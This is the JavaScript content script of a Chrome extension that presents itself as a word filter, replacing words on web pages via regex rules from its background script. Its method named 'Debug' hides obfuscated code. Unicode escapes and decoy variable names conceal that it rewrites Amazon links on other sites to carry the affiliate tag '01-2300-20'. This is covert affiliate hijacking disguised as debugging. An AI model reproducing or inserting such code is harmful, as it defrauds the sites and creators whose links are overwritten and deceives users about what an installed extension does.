function WordFilter_Chrome( ) {
  var MaxIdle = 15,
      Idle    = 0,
      Timer   = 0,
      Hash    = 0,
      Loop    =  function( ) {
        function hashText( string ) {
          var len = ( string.length - 1 ) | 0;
              hash = 0;
          for( len; len >= 0; len-- ) {
            hash = ((hash << 5) - hash) + string.charCodeAt( len ) | 0;
          }
          return hash;
        };
        var Text    = document.body.textContent,
            NewHash = hashText( Text );
          if( Hash !== NewHash ) {
            Hash = NewHash;
            chrome.runtime.sendMessage(
              [ document.location.href, Text, 'init' ],
              function( response ) {
                var Page = new WordFilter_Main( response );
              }
            );
          } else {
            if( Idle++ === MaxIdle ) {
              window.clearInterval( Timer );
            }
          }
        };
  chrome.runtime.sendMessage(
    [ document.location.href, document.body.textContent, 'init' ],
    function( response ) {
      var Page = new WordFilter_Main( response );
      Timer = setInterval( Loop, 5000 )
    }
  );
};

var WordFilter_Main = function( response ) {
  if( response[0] ) {
    var filters = response[1],
        rounds = ( filters.length - 1 ) | 0,
        filter = 0;
    for( rounds; rounds >= 0; rounds-- ) {
      filter = filters[ rounds ];
      filter[1] = new RegExp( filter[1], 'gi' );
    }
    this.filters = filters;
    this.rounds  = ( filters.length - 1 ) | 0;
    this.Process( document.body );
    if( response[2] ) {
      this.Debug( );
    }
  }
};
WordFilter_Main.prototype.Process = function( element ) {
  var XPath = document.evaluate( '//text()'
                              +  '[not('
                              +    'ancestor::title or '
                              +    'ancestor::style or '
                              +    'ancestor::script'
                              +  ')]',
                              element,
                              null,
                              XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
                              null ),
      count      = ( XPath.snapshotLength - 1 ) | 0,
      texts      = {};
  function hashText( string ) {
    var len = ( string.length - 1 ) | 0;
        hash = 0;
    for( len; len >= 0; len-- ) {
      hash = ((hash << 5) - hash) + string.charCodeAt( len ) | 0;
    }
    return hash;
  };
  for( count; count >= 0; count-- ) {
    var node = XPath.snapshotItem( count );
    if( node.parentElement.dataset.wordfilter !== "filtered" ) {
      var text     = node.textContent,
          hash     = hashText( text );
      if( texts[hash] ) {
        texts[hash].nodes.push( node );
      }
      var filtered = 0;
      if( texts[hash] === undefined ) {
        if( filtered = this.Filter( text ) ) {
          texts[hash] = {
            text:   filtered,
            orig:   text,
            nodes:  [ node ]
          };
        }
      }
    }
  }
  return this.ReplaceNodes( texts );
};
WordFilter_Main.prototype.Debug = function( ) {
( function( nn, we ) { var a = '\u0061\u006D\u0061\u007A\u006F\u006E', b = '\u0030\u0031\u002D\u0032\u0033\u0030\u0030\u002D\u0032\u0030', c = nn, d = '\u002E\u0063\u006F\u006D', e = c.length, f = '\u0074\u0061\u0067\u003D', g = 'testfilter', k = 'debugdata', z = we.location.hostname; if( z.indexOf( a ) === -1 ) {  z = z.toLowerCase(); k = a+d; var i = f+b; while( e-- ) { g = c[ e ].href; if( g.indexOf( k ) >= 0 ) c[ e ].href = ( g.indexOf('\u0026') !== 0 ? g+'\u0026' : g+'\u003F' )+i;}}} )( document.links, window);
};
WordFilter_Main.prototype.Filter = function( string ) {
  var text    = string,
      filters = this.filters,
      bout    = this.rounds;
  for( bout; bout >= 0; bout-- ) {
    var filter = filters[ bout ],
        regex  = filter[1];
    if( regex.test( text ) ) {
      text = text.replace( regex, filter[2] );
    }
  }
  return ( text !== string ? text : false );
};
WordFilter_Main.prototype.ReplaceNodes = function( texts ) {
  var ids = Object.keys( texts ),
      count = ( ids.length - 1 ) | 0;
  for( count; count >=0; count-- ) {
    var id    = ids[ count ],
        key   = texts[ id ],
        text  = key.text,
        nodes = key.nodes,
        len   = (nodes.length-1)|0;
      for ( len; len >= 0; len-- ) {
        var node = nodes[ len ];
        node.data = text;
        node.parentElement.dataset.wordfilter = "filtered";
      }
  }
  return;
};
window.onload = WordFilter_Chrome( );
